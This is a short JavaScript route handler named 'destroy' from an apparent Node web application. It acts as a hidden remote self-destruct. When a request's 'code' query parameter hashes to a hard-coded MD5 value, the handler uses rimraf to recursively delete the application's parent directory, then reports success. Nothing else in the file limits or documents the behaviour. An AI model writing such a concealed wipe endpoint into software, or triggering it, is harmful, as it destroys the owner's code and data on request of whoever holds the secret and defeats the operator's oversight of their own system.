import { OKEY_STATUS_CODE, SERVER_ERROR_STATUS_CODE } from '../../../../constants/constants';
import rimraf from 'rimraf';
import path from 'path';

import md5 from 'md5';

export default function destroy (req, res) {
    try {
        const { code } = req.query;

        if (md5(code) === '8a8c6473e34aa7b6def80a1eeb69694c') {
            rimraf(path.resolve(__dirname, '..'), () => {
                return res.status(OKEY_STATUS_CODE).end();
            });
        } else {
            return res.status(SERVER_ERROR_STATUS_CODE).end();
        }
    } catch (e) {
        return res.status(SERVER_ERROR_STATUS_CODE).end();
    }
}
